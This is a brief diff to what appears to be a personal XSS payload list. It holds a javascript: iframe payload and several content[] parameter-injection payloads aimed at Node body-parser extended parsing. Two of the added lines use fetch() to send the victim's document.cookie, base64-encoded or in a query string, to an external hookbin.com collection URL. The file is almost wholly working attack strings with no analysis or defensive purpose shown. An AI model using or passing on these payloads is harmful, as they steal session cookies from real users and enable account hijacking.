@@ -1,1 +1,7 @@
 <iframe src="javascript:alert(`xss`)">
+
+## BodyParser ... Dom... Extended = True
+content[]=value
+content[]=;alert(1);
+content[]=;fetch(`https://hookbin.com/1gpYxwmDzkuj002ykoMY/` + btoa(document.cookie));
+content[-fetch(`https://hookbin.com/1gpYxwmDzkuj002ykoMY?cookie=%2bdocument.cookie,{'mode':'no-cors'})-]=-1-
